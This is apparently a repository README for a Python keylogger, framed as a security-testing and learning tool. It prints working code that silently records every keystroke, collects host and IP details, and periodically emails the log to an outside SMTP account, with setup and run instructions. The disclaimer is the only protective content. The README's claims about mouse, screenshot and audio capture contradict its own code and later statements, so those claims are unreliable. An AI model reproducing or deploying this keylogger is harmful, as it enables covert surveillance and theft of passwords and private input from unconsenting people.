# Keylogger: A Comprehensive Guide to Information Security Testing

This project is designed to test the security of information systems by demonstrating the capabilities of a keylogger. It captures user input, takes screenshots, records audio, and sends this data to a specified email address. 

## Purpose

The primary purpose of this project is to illustrate the potential vulnerabilities of systems and the importance of implementing robust security measures. It serves as a learning tool for understanding how keyloggers work and how to prevent their use.

## Installation

1. **Install Required Packages:**  Ensure you have the necessary libraries. You can install them with the following command:
```bash
   pip install -r requirements.txt
```

## Configuration
1. Create a Mailtrap Account: Sign up for a free Mailtrap account (https://mailtrap.io/). This will provide a secure and disposable email address to receive the captured data.

2. Configure SMTP Credentials:

  - Open the keylogger.py file.
  - Locate the following lines:
```python
  EMAIL_ADDRESS = "YOUR_USERNAME"
  EMAIL_PASSWORD = "YOUR_PASSWORD"
```
  - Replace "YOUR_USERNAME" and "YOUR_PASSWORD" with your Mailtrap username and password respectively.

3. Adjust Reporting Frequency:

  - Find the following line in keylogger.py:
```python
SEND_REPORT_EVERY = 60 # as in seconds
```
  - Change the value of SEND_REPORT_EVERY to specify the interval (in seconds) at which the keylogger will send the collected data. For example, a value of 300 would send reports every 5 minutes.
## Usage
1. Run the Keylogger: Execute the following command in your terminal:
```shell
python3 keylogger.py
```
2. Data Collection: The keylogger will silently capture keyboard input, mouse activity, take screenshots, and record audio. It will then send this data to the email address you specified in the configuration.

3. Data Analysis: Review the collected data in your Mailtrap inbox to gain insights into user actions and system vulnerabilities.

## Key Components of the Keylogger 
1. Import Libraries
```python
import logging
import smtplib
import socket
import threading
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import keyboard
import os
```
This section imports essential libraries for capturing data, interacting with the system, handling email, and performing other necessary tasks.

2. KeyLogger Class
```python
class Klogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.start_logger()

    def append_to_log(self, string):
        self.log += string

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # Not a character, e.g. shift, ctrl, alt, etc.
            # Uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.append_to_log(name)

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Logger Report'

        msg.attach(MIMEText(message, 'plain'))

        try:
            server = smtplib.SMTP('smtp.mailtrap.io', 2525)
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        self.send_mail(self.email, self.password, self.system_info + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def get_system_info(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = platform.uname()
        return (f"Hostname: {hostname}\n"
                f"IP Address: {ip_address}\n"
                f"System: {system_info.system}\n"
                f"Node Name: {system_info.node}\n"
                f"Release: {system_info.release}\n"
                f"Version: {system_info.version}\n"
                f"Machine: {system_info.machine}\n"
                f"Processor: {system_info.processor}\n")

    def start_logger(self):
        self.report()
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
```
This class implements the core logic of the keylogger. It handles:

  - Data Collection: Captures keyboard input, mouse events, and system information using the keyboard library.
  - Data Storage: Appends collected data to a log string.
  - Email Sending: Sends a report containing the collected data to the configured email address using the smtplib library.
  - Reporting Mechanism: Sets up a timer to periodically send reports using the threading library.
  - System Information Gathering: Retrieves system details like hostname, IP address, processor, operating system, and machine type using the socket and platform libraries.
  - Microphone Recording: (Not implemented in this example) This functionality can be added using libraries like pyaudio to record audio from the microphone.
  - Screenshot Capture: (Not implemented in this example) This functionality can be added using libraries like pyscreenshot to capture screenshots of the screen.

3. Keylogger Initialization and Execution
```python
if __name__ == "__main__":
    logger = Klogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
```
This section creates an instance of the Klogger class, configures it with the specified settings, and starts the data collection and reporting process.

Security Considerations
Important: This keylogger is provided for educational purposes only and should never be used for malicious activities. It's essential to be aware of the ethical implications of using such tools and to comply with all relevant laws and regulations.

**Disclaimer: This keylogger is for educational purposes only. Do not use it for illegal or unauthorized activities. The author is not responsible for any damage or misuse of this code.**

# Conclusion
By using this keylogger, you can gain a better understanding of how data can be intercepted and the importance of security best practices. Remember to use this tool responsibly and ethically.